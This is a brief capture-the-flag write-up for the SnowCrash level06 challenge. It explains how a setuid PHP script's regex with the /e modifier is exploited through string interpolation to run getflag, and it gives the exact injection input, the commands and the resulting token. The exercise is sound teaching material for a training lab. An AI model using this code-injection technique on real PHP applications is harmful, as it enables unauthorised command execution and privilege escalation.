We found a PHP script and the executable for that script in the home folder.
We noticed a regex with the suffix e, which means the substitued result will be evaluated, the executable had the s flag for flag06, which meant if we manage to run getflag with it, it would give us the token.
The program takes 2 parameters, the first one will be sent into the regex that ends up being evaluated, the second is just used as the variable z.
Using string interpolation, we managed to find a regex that would execute the getflag command:
level06@SnowCrash:~$ echo "[x {\$z(getflag)}]" > /tmp/a
level06@SnowCrash:~$ ./level06 /tmp/a exec
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub
